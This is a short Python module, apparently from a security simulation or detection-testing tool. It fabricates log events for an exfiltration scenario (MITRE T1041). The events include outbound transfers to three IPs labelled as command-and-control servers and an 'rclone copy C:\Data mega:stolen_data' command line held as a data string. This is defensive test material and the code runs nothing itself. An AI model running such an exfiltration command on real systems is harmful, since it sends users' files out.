# simulation/scenarios/exfiltration.py  — T1041
import time, random

C2_IPS = ["185.220.101.45","5.188.206.14","194.165.16.77"]

def run(intensity="medium"):
    ip   = random.choice(C2_IPS)
    user = random.choice(["attacker","SYSTEM"])
    now  = time.time()
    n    = {"low":2,"medium":4,"high":8}.get(intensity, 4)
    events = []
    for i in range(n):
        events.append({"type":"port_connect","ip":ip,"username":user,
                       "timestamp":now-i*10,"source":"simulation","severity":"HIGH",
                       "port":443,"detail":f"Large outbound transfer {random.randint(10,200)}MB"})
    events.append({"type":"process_create","ip":"local","username":user,
                   "timestamp":now,"source":"simulation","severity":"CRITICAL",
                   "process":"rclone.exe","cmdline":f"rclone copy C:\\Data mega:stolen_data"})
    return {"technique_id":"T1041","technique_name":"Exfiltration",
            "tactic":"Exfiltration","severity":"CRITICAL","intensity":intensity,
            "attacker_ip":ip,"target_user":user,"event_count":len(events),"events":events,
            "description":f"Simulated data exfiltration via {n} large outbound transfers + rclone"}
